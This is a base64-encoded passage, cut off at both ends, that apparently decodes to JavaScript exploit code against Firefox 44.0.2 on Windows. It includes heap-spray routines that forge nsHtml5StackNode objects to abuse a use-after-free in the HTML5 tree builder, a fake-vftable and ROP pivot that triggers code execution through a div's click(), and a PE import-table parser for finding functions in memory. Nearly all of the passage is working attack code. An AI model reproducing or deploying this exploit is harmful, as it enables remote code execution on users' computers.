nRhYmxlIHRvDQogICAgICogd3JpdGFibGUgbWVtb3J5Lg0KICAgICAqLw0KICAgIHRoaXMuY3JlYXRlRXhlY3V0ZURpdiA9IGZ1bmN0aW9uKCkgew0KICAgICAgICBjb25zdCBkaXYgPSB7fTsNCg0KICAgICAgICAvKiAweDMwMDAgYnl0ZXMgc2hvdWxkIGJlIGVub3VnaCBmb3IgdGhlIGRpdiwgdmZ0YWJsZSBhbmQgZ2FkZ2V0cyAqLw0KICAgICAgICBkaXYubWVtID0gdGhpcy5jYWxsb2MoMHgzMDAwKTsNCg0KICAgICAgICBkaXYuZWxlbSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOw0KICAgICAgICB0aGlzLnNldEFycmF5RWxlbShkaXYubWVtLmlkeCwgZGl2LmVsZW0pOw0KDQogICAgICAgIC8qIGFkZHIgb2YgdGhlIGRpdiAqLw0KICAgICAgICBjb25zdCBhZGRyID0gdGhpcy51MzJhcnJheVtkaXYubWVtLmlkeF07DQoNCiAgICAgICAgLyogKihhZGRyKzQpID0gdGhpcyAqLw0KICAgICAgICBjb25zdCB0aHMgPSB0aGlzLnJlYWREV29yZChhZGRyICsgNCo0KTsNCg0KICAgICAgICAvKiAqdGhpcyA9IHh1bCFtb3ppbGxhOjpkb206OkhUTUxEaXZFbGVtZW50OjpgdmZ0YWJsZScgKi8NCiAgICAgICAgY29uc3QgdmZ0YWJsZSA9IHRoaXMucmVhZERXb3JkKHRocyk7DQoNCiAgICAgICAgLyogY29weSB0aGUgdmZ0YWJsZSAodGhlIHNpemUgaXMgYSBndWVzc3RpbWF0ZSkgKi8NCiAgICAgICAgY29uc3QgZW50cmllcyA9IHRoaXMucmVhZERXb3Jkcyh2ZnRhYmxlLCA1MTIpOw0KICAgICAgICB0aGlzLndyaXRlRFdvcmRzKGRpdi5tZW0uYWRkciArIDQqMiwgZW50cmllcyk7DQoNCiAgICAgICAgLyogcmVwbGFjZSB0aGUgcG9pbnRlciB0byB0aGUgb3JpZ2luYWwgdmZ0YWJsZSB3aXRoIG91cnMgKi8NCiAgICAgICAgdGhpcy53cml0ZURXb3JkKHRocywgZGl2Lm1lbS5hZGRyICsgNCoyKTsNCg0KICAgICAgICByZXR1cm4gZGl2Ow0KICAgIH07DQoNCiAgICAvKg0KICAgICAqIFJlcGxhY2VzIHR3byB2ZnRhYmxlIGVudHJpZXMgb2YgdGhlIHByZXZpb3VzbHkgY3JlYXRlZCBkaXYgYW5kDQogICAgICogdHJpZ2dlcnMgY29kZSBleGVjdXRpb24NCiAgICAgKi8NCiAgICB0aGlzLmV4ZWN1dGUgPSBmdW5jdGlvbihwaXZvdCwgcG9zdFBpdm90KSB7DQogICAgICAgIC8qIHZmdGFibGUgZW50cnkgZm9yIHh1bCFuc0dlbmVyaWNIVE1MRWxlbWVudDo6UXVlcnlJbnRlcmZhY2UNCiAgICAgICAgICoga2luZCBvZiB1Z2x5LCBidXQgd2UnbGwgbGFuZCBoZXJlIGFmdGVyIHRoZSBwaXZvdCB0aGF0J3MgdXNlZA0KICAgICAgICAgKiBpbiBST1BIZWxwZXIuZXhlY3V0ZSgpICovDQogICAgICAgIGNvbnN0IHNhdmVkUXVlcnlJbnRlcmZhY2UgPSB0aGlzLnUzMmFycmF5W3RoaXMuZGl2Lm1lbS5pZHggKyAyXTsNCiAgICAgICAgdGhpcy51MzJhcnJheVt0aGlzLmRpdi5tZW0uaWR4ICsgMl0gPSBwb3N0UGl2b3Q7DQoNCiAgICAgICAgLyogdmZ0YWJsZSBlbnRyeSBmb3IgeHVsIW5zR2VuZXJpY0hUTUxFbGVtZW50OjpDbGljayAqLw0KICAgICAgICBjb25zdCBzYXZlZENsaWNrID0gdGhpcy51MzJhcnJheVt0aGlzLmRpdi5tZW0uaWR4ICsgMTMxXTsNCiAgICAgICAgdGhpcy51MzJhcnJheVt0aGlzLmRpdi5tZW0uaWR4ICsgMTMxXSA9IHBpdm90Ow0KDQogICAgICAgIC8qIGV4ZWN1dGUgKi8NCiAgICAgICAgdGhpcy5kaXYuZWxlbS5jbGljaygpOw0KDQogICAgICAgIC8qIHJlc3RvcmUgb3VyIG92ZXJ3cml0dGVuIHZmdGFibGUgcG9pbnRlcnMgKi8NCiAgICAgICAgdGhpcy51MzJhcnJheVt0aGlzLmRpdi5tZW0uaWR4ICsgMl0gPSBzYXZlZFF1ZXJ5SW50ZXJmYWNlOw0KICAgICAgICB0aGlzLnUzMmFycmF5W3RoaXMuZGl2Lm1lbS5pZHggKyAxMzFdID0gc2F2ZWRDbGljazsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBSZXNlcnZlcyBzcGFjZSBpbiB0aGUgYHUzMmFycmF5JyBhbmQgaW5pdGlhbGl6ZXMgaXQgdG8gMC4NCiAgICAgKg0KICAgICAqIFJldHVybnMgYW4gb2JqZWN0IHdpdGggdGhlIGZvbGxvd2luZyBwcm9wZXJ0aWVzOg0KICAgICAqIC0gaWR4OiBpbmRleCBvZiB0aGUgc3RhcnQgb2YgdGhlIGFsbG9jYXRpb24gaW4gdGhlIHUzMmFycmF5DQogICAgICogLSBhZGRyOiBzdGFydCBhZGRyZXNzIG9mIHRoZSBhbGxvY2F0aW9uDQogICAgICogLSBzaXplOiBub24tcGFkZGVkIGFsbG9jYXRpb24gc2l6ZQ0KICAgICAqIC0gcmVhbFNpemU6IHBhZGRlZCBzaXplDQogICAgICovDQogICAgdGhpcy5jYWxsb2MgPSBmdW5jdGlvbihzaXplKSB7DQogICAgICAgIGxldCBwYWRkZWQgPSBzaXplOw0KICAgICAgICBpZiAoIXNpemUgfHwgc2l6ZSAlIDQpIHsNCiAgICAgICAgICAgIHBhZGRlZCArPSA0IC0gc2l6ZSAlIDQ7DQogICAgICAgIH0NCg0KICAgICAgICBjb25zdCBmb3VuZCA9IFtdOw0KICAgICAgICAvKiB0aGUgZmlyc3QgZmV3IGR3b3JkcyBhcmUgcmVzZXJ2ZWQgZm9yIHRoZSBtZXRhZGF0YSBiZWxvbmdpbmcNCiAgICAgICAgICogdG8gYHRoaXMuYXJyYXknIGFuZCBmb3IgdGhlIEpTU3RyaW5nIGluIHJlYWRCeXRlcyAoc2luY2UgdXNpbmcNCiAgICAgICAgICogdGhpcyBmdW5jdGlvbiB3b3VsZCBpbXBhY3QgdGhlIHNwZWVkIG9mIHRoZSBST1AgaHVudGluZykgKi8NCiAgICAgICAgZm9yIChsZXQgaSA9IDEwOyBpIDwgdGhpcy51MzJhcnJheS5sZW5ndGggLSAxOyBpICs9IDIpIHsNCiAgICAgICAgICAgIGlmICh0aGlzLnUzMmFycmF5W2ldID09PSAweDExMjIzMzQ0ICYmDQogICAgICAgICAgICAgICAgdGhpcy51MzJhcnJheVtpKzFdID09PSAweDU1NjY3Nzg4KSB7DQogICAgICAgICAgICAgICAgZm91bmQucHVzaChpLCBpKzEpOw0KICAgICAgICAgICAgICAgIGlmIChmb3VuZC5sZW5ndGggPj0gcGFkZGVkIC8gNCkgew0KICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBqID0gMDsgaiA8IGZvdW5kLmxlbmd0aDsgaisrKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0aGlzLnUzMmFycmF5W2ZvdW5kW2pdXSA9IDA7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkeDogZm91bmRbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICBhZGRyOiB0aGlzLnUzMmJhc2UgKyBmb3VuZFswXSo0LA0KICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZTogc2l6ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlYWxTaXplOiBwYWRkZWQsDQogICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBmb3VuZC5sZW5ndGggPSAwOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHRocm93IG5ldyBFcnJvcigiY2FsbG9jKCk6IG91dCBvZiBtZW1vcnkiKTsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBSZXR1cm5zIGFuIGVsZW1lbnQgaW4gYGFycmF5JyBiYXNlZCBvbiBhbiBpbmRleCBmb3IgYHUzMmFycmF5Jw0KICAgICAqLw0KICAgIHRoaXMuZ2V0QXJyYXlFbGVtID0gZnVuY3Rpb24oaWR4KSB7DQogICAgICAgIGlmIChpZHggPD0gMyB8fCBpZHggJSAyKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoImludmFsaWQgaW5kZXgiKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdGhpcy5hcnJheVsoaWR4IC0gNCkgLyAyXTsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBTZXRzIGFuIGVsZW1lbnQgaW4gYGFycmF5JyBiYXNlZCBvbiBhbiBpbmRleCBmb3IgYHUzMmFycmF5Jw0KICAgICAqLw0KICAgIHRoaXMuc2V0QXJyYXlFbGVtID0gZnVuY3Rpb24oaWR4LCB2YWx1ZSkgew0KICAgICAgICBpZiAoaWR4IDw9IDMgfHwgaWR4ICUgMikgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJpbnZhbGlkIGluZGV4Iik7DQogICAgICAgIH0NCiAgICAgICAgdGhpcy5hcnJheVsoaWR4IC0gNCkgLyAyXSA9IHZhbHVlOw0KICAgIH07DQoNCiAgICB0aGlzLmRpdiA9IHRoaXMuY3JlYXRlRXhlY3V0ZURpdigpOw0KfQ0KDQpmdW5jdGlvbiBQb3J0YWJsZUV4ZWN1dGFibGUoYmFzZSwgcnd4KSB7DQogICAgdGhpcy5iYXNlID0gYmFzZTsNCiAgICB0aGlzLnJ3eCA9IHJ3eDsNCiAgICB0aGlzLmltcG9ydHMgPSB7fTsNCiAgICB0aGlzLnRleHQgPSB7fTsNCg0KICAgIC8qDQogICAgICogUGFyc2VzIHRoZSBQRSBpbXBvcnQgdGFibGUuICBTb21lIHJlc291cmNlcyBvZiBpbnRlcmVzdDoNCiAgICAgKg0KICAgICAqIC0gQW4gSW4tRGVwdGggTG9vayBpbnRvIHRoZSBXaW4zMiBQb3J0YWJsZSBFeGVjdXRhYmxlIEZpbGUgRm9ybWF0DQogICAgICogICBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9tYWdhemluZS9iYjk4NTk5MihwcmludGVyKS5hc3B4DQogICAgICoNCiAgICAgKiAtIE1pY3Jvc29mdCBQb3J0YWJsZSBFeGVjdXRhYmxlIGFuZCBDb21tb24gT2JqZWN0IEZpbGUgRm9ybWF0IFNwZWNpZmljYXRpb24NCiAgICAgKiAgIGh0dHBzOi8vd3d3Lm1pY3Jvc29mdC5jb20vZW4tdXMvZG93bmxvYWQvZGV0YWlscy5hc3B4P2lkPTE5NTA5DQogICAgICoNCiAgICAgKiAtIFVuZGVyc3RhbmRpbmcgdGhlIEltcG9ydCBBZGRyZXNzIFRhYmxlDQogICAgICogICBodHRwOi8vc2FuZHNwcml0ZS5jb20vQ29kZVN0dWZmL1VuZGVyc3RhbmRpbmdfaW1wb3J0cy5odG1sDQogICAgICovDQogICAgdGhpcy5yZWFkID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGNvbnN0IHJ3eCA9IHRoaXMucnd4Ow0KICAgICAgICBsZXQgYWRkciA9IHRoaXMuYmFzZTsNCg0KICAgICAgICAvKg0KICAgICAgICAgKiBET1MgaGVhZGVyDQogICAgICAgICAqLw0KICAgICAgICBjb25zdCBtYWdpYyA9IHJ3eC5yZWFkV29yZChhZGRyKTsNCiAgICAgICAgaWYgKG1hZ2ljICE9PSAweDVhNGQpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigiYmFkIERPUyBoZWFkZXIiKTsNCiAgICAgICAgfQ0KICAgICAgICBjb25zdCBsZmFuZXcgPSByd3gucmVhZERXb3JkKGFkZHIgKyAweDNjLCA0KTsNCiAgICAgICAgYWRkciArPSBsZmFuZXc7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogU2lnbmF0dXJlDQogICAgICAgICAqLw0KICAgICAgICBjb25zdCBzaWduYXR1cmUgPSByd3gucmVhZERXb3JkKGFkZHIpOw0KICAgICAgICBpZiAoc2lnbmF0dXJlICE9PSAweDAwMDA0NTUwKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoImJhZCBzaWduYXR1cmUiKTsNCiAgICAgICAgfQ0KICAgICAgICBhZGRyICs9IDQ7DQoNCiAgICAgICAgLyoNCiAgICAgICAgICogQ09GRiBGaWxlIEhlYWRlcg0KICAgICAgICAgKi8NCiAgICAgICAgYWRkciArPSAyMDsNCg0KICAgICAgICAvKg0KICAgICAgICAgKiBPcHRpb25hbCBIZWFkZXINCiAgICAgICAgICovDQogICAgICAgIGNvbnN0IG9wdGlvbmFsTWFnaWMgPSByd3gucmVhZFdvcmQoYWRkcik7DQogICAgICAgIGlmIChvcHRpb25hbE1hZ2ljICE9PSAweDAxMGIpIHsNCiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigiYmFkIG9wdGlvbmFsIGhlYWRlciIpOw0KICAgICAgICB9DQoNCiAgICAgICAgdGhpcy50ZXh0LnNpemUgPSByd3gucmVhZERXb3JkKGFkZHIgKyA0KTsNCiAgICAgICAgdGhpcy50ZXh0LmJhc2UgPSB0aGlzLmJhc2UgKyByd3gucmVhZERXb3JkKGFkZHIgKyAyMCk7DQoNCiAgICAgICAgY29uc3QgbnVtYmVyT2ZSdmFBbmRTaXplcyA9IHJ3eC5yZWFkRFdvcmQoYWRkciArIDkyKTsNCiAgICAgICAgYWRkciArPSA5NjsNCg0KICAgICAgICAvKg0KICAgICAgICAgKiBPcHRpb25hbCBIZWFkZXIgRGF0YSBEaXJlY3Rvcmllcw0KICAgICAgICAgKg0KICAgICAgICAgKiBOIGVudHJpZXMgKiAyIERXT1JEcyAoUlZBIGFuZCBzaXplKQ0KICAgICAgICAgKi8NCiAgICAgICAgY29uc3QgZGlyZWN0b3JpZXMgPSByd3gucmVhZERXb3JkcyhhZGRyLCBudW1iZXJPZlJ2YUFuZFNpemVzICogMik7DQoNCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBkaXJlY3Rvcmllc1szXSAtIDUqNDsgaSArPSA1KjQpIHsNCiAgICAgICAgICAgIC8qIEltcG9ydCBEaXJlY3RvcnkgVGFibGUgKE4gZW50cmllcyAqIDUgRFdPUkRzKSAqLw0KICAgICAgICAgICAgY29uc3QgbWVtYmVycyA9IHJ3eC5yZWFkRFdvcmRzKHRoaXMuYmFzZSArIGRpcmVjdG9yaWVzWzJdICsgaSwgNSk7DQogICAgICAgICAgICBjb25zdCBsb29rdXBUYWJsZSA9IHRoaXMuYmFzZSArIG1lbWJlcnNbMF07DQogICAgICAgICAgICBjb25zdCBkbGxOYW1lID0gcnd4LnJlYWRTdHJpbmcodGhpcy5iYXNlK21lbWJlcnNbM10pLnRvTG93ZXJDYXNlKCk7DQogICAgICAgICAgICBjb25zdCBhZGRyVGFibGUgPSB0aGlzLmJhc2UgKyBtZW1iZXJzWzRdOw0KDQogICAgICAgICAgICB0aGlzLmltcG9ydHNbZGxsTmFtZV0gPSB7fTsNCg0KICAgICAgICAgICAgLyogSW1wb3J0IExvb2t1cCBUYWJsZSAqLw0KICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IDsgaiArPSA0KSB7DQogICAgICAgICAgICAgICAgY29uc3QgaGludE5hbWVSdmEgPSByd3gucmVhZERXb3JkKGxvb2t1cFRhYmxlICsgaik7DQogICAgICAgICAgICAgICAgLyogdGhlIGxhc3QgZW50cnkgaXMgTlVMTCAqLw0KICAgICAgICAgICAgICAgIGlmIChoaW50TmFtZVJ2YSA9PT0gMCkgew0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAvKiBuYW1lIGlzIG5vdCBhdmFpbGFibGUgaWYgdGhlIGRsbCBpcyBpbXBvcnRlZCBieSBvcmRpbmFsICovDQogICAgICAgICAgICAgICAgaWYgKGhpbnROYW1lUnZhICYgKDEgPDwgMzEpKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGNvbnN0IGltcG9ydE5hbWUgPSByd3gucmVhZFN0cmluZyh0aGlzLmJhc2UgKyBoaW50TmFtZVJ2YSArIDIpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGltcG9ydEFkZHIgPSByd3gucmVhZERXb3JkKGFkZHJUYWJsZSArIGopOw0KICAgICAgICAgICAgICAgIHRoaXMuaW1wb3J0c1tkbGxOYW1lXVtpbXBvcnROYW1lXSA9IGltcG9ydEFkZHI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBTZWFyY2hlcyBmb3IgYW4gaW1wb3J0ZWQgc3ltYm9sDQogICAgICovDQogICAgdGhpcy5zZWFyY2ggPSBmdW5jdGlvbihkbGwsIHN5bWJvbCkgew0KICAgICAgICBpZiAodGhpcy5pbXBvcnRzW2RsbF0gPT09IHVuZGVmaW5lZCkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJ1bmtub3duIGRsbDogIiArIGRsbCk7DQogICAgICAgIH0NCg0KICAgICAgICBjb25zdCBhZGRyID0gdGhpcy5pbXBvcnRzW2RsbF1bc3ltYm9sXTsNCiAgICAgICAgaWYgKGFkZHIgPT09IHVuZGVmaW5lZCkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCJ1bmtub3duIHN5bWJvbDogIiArIHN5bWJvbCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGFkZHI7DQogICAgfTsNCn0NCg0KZnVuY3Rpb24gU3ByYXkoKSB7DQogICAgdGhpcy5ub2RlQmFzZSA9IDB4ODAwMDAwMDA7DQogICAgdGhpcy5wdHJOdW0gPSA2NDsNCiAgICB0aGlzLnJlZmNvdW50ID0gMHhmZmZmZmZmZjsNCiAgICAvKg0KICAgICAqIDA6MDA1PiA/PyBzaXplb2YobnNIdG1sNVN0YWNrTm9kZSkNCiAgICAgKiB1bnNpZ25lZCBpbnQgMHgxYw0KICAgICAqLw0KICAgIHRoaXMubnNIdG1sNVN0YWNrTm9kZVNpemUgPSAweDFjOw0KDQogICAgLyoNCiAgICAgKiBDcmVhdGVzIGEgYnVuY2ggb2YgZmFrZSBuc0h0bWw1U3RhY2tOb2RlOnMgd2l0aCB0aGUgaG9wZSBvZiBoaXR0aW5nDQogICAgICogdGhlIGFkZHJlc3Mgb2YgZWxlbWVudE5hbWUtPm5hbWUgd2hlbiBpdCdzIFt4dWwhbnNIdG1sNUF0b21zOjpzdHlsZV0uDQogICAgICoNCiAgICAgKiBVbHRpbWF0ZWx5LCB0aGUgZ29hbCBpcyB0byBlbnRlciB0aGUgY29uZGl0aW9uYWwgb24gbGluZSAyNzQzOg0KICAgICAqDQogICAgICogZmlyZWZveC00NC4wLjIvcGFyc2VyL2h0bWwvbnNIdG1sNVRyZWVCdWlsZGVyLmNwcDoyNzQzDQogICAgICogLC0tLS0NCiAgICAgKiB8IDIyMTQgdm9pZA0KICAgICAqIHwgMjIxNSBuc0h0bWw1VHJlZUJ1aWxkZXI6OmVuZFRhZyhuc0h0bWw1RWxlbWVudE5hbWUqIGVsZW1lbnROYW1lKQ0KICAgICAqIHwgMjIxNiB7DQogICAgICogfCAuLi4uDQogICAgICogfCAyMjIxICAgbnNJQXRvbSogbmFtZSA9IGVsZW1lbnROYW1lLT5uYW1lOw0KICAgICAqIHwgLi4uLg0KICAgICAqIHwgMjc0MSAgIGZvciAoOyA7ICkgew0KICAgICAqIHwgMjc0MiAgICAgbnNIdG1sNVN0YWNrTm9kZSogbm9kZSA9IHN0YWNrW2VsdFBvc107DQogICAgICogfCAyNzQzICAgICBpZiAobm9kZS0+bnMgPT0ga05hbWVTcGFjZUlEX1hIVE1MICYmIG5vZGUtPm5hbWUgPT0gbmFtZSkgew0KICAgICAqIHwgLi4uLg0KICAgICAqIHwgMjc0OCAgICAgICB3aGlsZSAoY3VycmVudFB0ciA+PSBlbHRQb3MpIHsNCiAgICAgKiB8IDI3NDkgICAgICAgICBwb3AoKTsNCiAgICAgKiB8IDI3NTAgICAgICAgfQ0KICAgICAqIHwgMjc1MSAgICAgICBOU19IVE1MNV9CUkVBSyhlbmR0YWdsb29wKTsNCiAgICAgKiB8IDI3NTIgICAgIH0gZWxzZSBpZiAobm9kZS0+aXNTcGVjaWFsKCkpIHsNCiAgICAgKiB8IDI3NTMgICAgICAgZXJyU3RyYXlFbmRUYWcobmFtZSk7DQogICAgICogfCAyNzU0ICAgICAgIE5TX0hUTUw1X0JSRUFLKGVuZHRhZ2xvb3ApOw0KICAgICAqIHwgMjc1NSAgICAgfQ0KICAgICAqIHwgMjc1NiAgICAgZWx0UG9zLS07DQogICAgICogfCAyNzU3ICAgfQ0KICAgICAqIHwgLi4uLg0KICAgICAqIHwgMzAzNSB9DQogICAgICogYC0tLS0NCiAgICAgKg0KICAgICAqIFdlIGdldCA2NCBhdHRlbXB0cyBlYWNoIHRpbWUgdGhlIGJ1ZyBpcyB0cmlnZ2VyZWQgLS0gaG93ZXZlciwgaW4NCiAgICAgKiBvcmRlciB0byBoYXZlIGEgY2xlYW4gYnJlYWssIHRoZSBsYXN0IG5vZGUgaGFzIGl0cyBmbGFncyBzZXQgdG8NCiAgICAgKiBOU19IVE1MNUVMRU1FTlRfTkFNRV9TUEVDSUFMLCBzbyB0aGF0IHRoZSBjb25kaXRpb25hbCBvbiBsaW5lDQogICAgICogMjc1MiBpcyBlbnRlcmVkLg0KICAgICAqDQogICAgICogSWYgd2UgZG8gZmluZCBvdXJzZWx2ZXMgd2l0aCBhIG5vZGUtPm5hbWUgPT0gbmFtZSwgdGhlbg0KICAgICAqIG5zSHRtbDVUcmVlQnVpbGRlcjo6cG9wKCkgaW52b2tlcyBuc0h0bWw1U3RhY2tOb2RlOjpyZWxlYXNlKCkuDQogICAgICogVGhlIHJlbGVhc2UoKSBtZXRob2QgZGVjcmVtZW50cyB0aGUgbm9kZXMgcmVmY291bnQgLS0gYW5kLCBpZiB0aGUNCiAgICAgKiByZWZjb3VudCByZWFjaGVzIDAsIGFsc28gZGVsZXRlcyBpdC4NCiAgICAgKg0KICAgICAqIEFzc3VtaW5nIGV2ZXJ5dGhpbmcgZ29lcyB3ZWxsLCB0aGUgVWludDMyQXJyYXkgaXMgYWxsb2NhdGVkIHdpdGgNCiAgICAgKiB0aGUgbWV0aG9kIHByZXNlbnRlZCBieSBTa3lMaW5lZC9AYmVyZW5kamFud2V2ZXIgaW46DQogICAgICoNCiAgICAgKiAiSGVhcCBzcHJheWluZyBoaWdoIGFkZHJlc3NlcyBpbiAzMi1iaXQgQ2hyb21lL0ZpcmVmb3ggb24gNjQtYml0IFdpbmRvd3MiDQogICAgICogaHR0cDovL2Jsb2cuc2t5bGluZWQubmwvMjAxNjA2MjIwMDEuaHRtbA0KICAgICAqLw0KICAgIHRoaXMubm9kZXMgPSBmdW5jdGlvbihuYW1lLCBicnV0ZWZvcmNlKSB7DQogICAgICAgIGNvbnN0IG5vZGVzID0gbmV3IFVpbnQzMkFycmF5KDB4MTkwMDAwMDApOw0KICAgICAgICBjb25zdCBzaXplID0gdGhpcy5uc0h0bWw1U3RhY2tOb2RlU2l6ZSAvIDQ7DQogICAgICAgIGNvbnN0IHJlZmNvdW50ID0gYnJ1dGVmb3JjZSA/IHRoaXMucmVmY291bnQgOiAxOw0KICAgICAgICBsZXQgZmxhZ3MgPSAwOw0KDQogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgdGhpcy5wdHJOdW0gKiBzaXplOyBpICs9IHNpemUpIHsNCiAgICAgICAgICAgIGlmIChpID09PSAodGhpcy5wdHJOdW0gLSAxKSAqIHNpemUpIHsNCiAgICAgICAgICAgICAgICBmbGFncyA9IDEgPDwgMjk7IC8qIE5TX0hUTUw1RUxFTUVOVF9OQU1FX1NQRUNJQUwgKi8NCiAgICAgICAgICAgICAgICBuYW1lID0gMHgwOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgbm9kZXNbaV0gPSBmbGFnczsNCiAgICAgICAgICAgIG5vZGVzW2krMV0gPSBuYW1lOw0KICAgICAgICAgICAgbm9kZXNbaSsyXSA9IDA7IC8qIHBvcE5hbWUgKi8NCiAgICAgICAgICAgIG5vZGVzW2krM10gPSAzOyAvKiBucyAoa05hbWVTcGFjZUlEX1hIVE1MKSAqLw0KICAgICAgICAgICAgbm9kZXNbaSs0XSA9IDA7IC8qIG5vZGUgKi8NCiAgICAgICAgICAgIG5vZGVzW2krNV0gPSAwOyAvKiBhdHRyaWJ1dGVzICovDQogICAgICAgICAgICBub2Rlc1tpKzZdID0gcmVmY291bnQ7DQogICAgICAgICAgICBuYW1lICs9IDB4MTAwMDAwOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBub2RlczsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBTcHJheXMgcG9pbnRlcnMgdG8gdGhlIGZha2UgbnNIdG1sNVN0YWNrTm9kZTpzIGNyZWF0ZWQgaW4gbm9kZXMoKQ0KICAgICAqLw0KICAgIHRoaXMucG9pbnRlcnMgPSBmdW5jdGlvbigpIHsNCiAgICAgICAgY29uc3QgcG9pbnRlcnMgPSBuZXcgQXJyYXkoKTsNCg0KICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IDB4MzAwMDA7IGkrKykgew0KICAgICAgICAgICAgcG9pbnRlcnNbaV0gPSBuZXcgVWludDMyQXJyYXkodGhpcy5wdHJOdW0pOw0KICAgICAgICAgICAgbGV0IG5vZGUgPSB0aGlzLm5vZGVCYXNlOw0KICAgICAgICAgICAgZm9yIChsZXQgaiA9IHBvaW50ZXJzW2ldLmxlbmd0aCAtIDE7IGogPj0gMDsgai0tKSB7DQogICAgICAgICAgICAgICAgcG9pbnRlcnNbaV1bal0gPSBub2RlOw0KICAgICAgICAgICAgICAgIG5vZGUgKz0gdGhpcy5uc0h0bWw1U3RhY2tOb2RlU2l6ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gcG9pbnRlcnM7DQogICAgfTsNCg0KICAgIC8qDQogICAgICogU3ByYXlzIGEgYnVuY2ggb2YgYXJyYXlzIHdpdGggdGhlIGdvYWwgb2YgaGF2aW5nIG9uZSBoaWphY2sgdGhlDQogICAgICogcHJldmlvdXNseSBmcmVlZCBVaW50MzJBcnJheQ0KICAgICAqLw0KICAgIHRoaXMuYXJyYXlzID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGNvbnN0IGFycmF5ID0gbmV3IEFycmF5KCk7DQoNCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCAweDgwMDsgaSsrKSB7DQogICAgICAgICAgICBhcnJheVtpXSA9IG5ldyBBcnJheSgpOw0KICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCAweDEwMDAwOyBqKyspIHsNCiAgICAgICAgICAgICAgICAvKiAweDExMjIzMzQ0LCAweDU1NjY3Nzg4ICovDQogICAgICAgICAgICAgICAgYXJyYXlbaV1bal0gPSAyLjUxNjAwODI5MzQwMDk3OTNlKzEwMzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gYXJyYXk7DQogICAgfTsNCg0KICAgIC8qDQogICAgICogTm90IHN1cmUgaG93IHJlbGlhYmxlIHRoaXMgaXMsIGJ1dCBvbiAzIG1hY2hpbmVzIHJ1bm5pbmcgd2luMTAgb24NCiAgICAgKiBiYXJlIG1ldGFsIGFuZCBvbiBhIGZldyBWTXMgd2l0aCB3aW43L3dpbjEwIChhbGwgd2l0aCBhbmQgd2l0aG91dA0KICAgICAqIEVNRVQpLCBbeHVsIW5zSHRtbDVBdG9tczo6c3R5bGVdIHdhcyBhbHdheXMgZm91bmQgd2l0aGluDQogICAgICogMHhbMDBhLTFjMl1mW2EtZl02KGN8ZSkwDQogICAgICovDQogICAgdGhpcy5nZXROZXh0QWRkciA9IGZ1bmN0aW9uKGN1cnJlbnQpIHsNCiAgICAgICAgY29uc3Qgc3RhcnQgPSAweDAwYWZhNmMwOw0KDQogICAgICAgIGlmICghY3VycmVudCkgew0KICAgICAgICAgICAgcmV0dXJuIHN0YXJ0Ow0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKChjdXJyZW50ID4+IDIwKSA8IDB4MTUwKSB7DQogICAgICAgICAgICByZXR1cm4gY3VycmVudCArIDB4MTAwMDAwKih0aGlzLnB0ck51bS0xKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgoY3VycmVudCA+PiAxMiAmIDB4ZikgIT09IDB4Zikgew0KICAgICAgICAgICAgcmV0dXJuIChjdXJyZW50ICsgMHgxMDAwKSAmIH4oMHhmZmYgPDwgMjApIHwgKHN0YXJ0ID4+IDIwKSA8PCAyMDsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgoY3VycmVudCA+PiA0ICYgMHhmKSA9PT0gMHhjKSB7DQogICAgICAgICAgICByZXR1cm4gc3RhcnQgKyAweDIwOw0KICAgICAgICB9DQogICAgICAgIHRocm93IG5ldyBFcnJvcigib3V0IG9mIGd1ZXNzZXMiKTsNCiAgICB9Ow0KDQogICAgLyoNCiAgICAgKiBSZXR1cm5zIHRoZ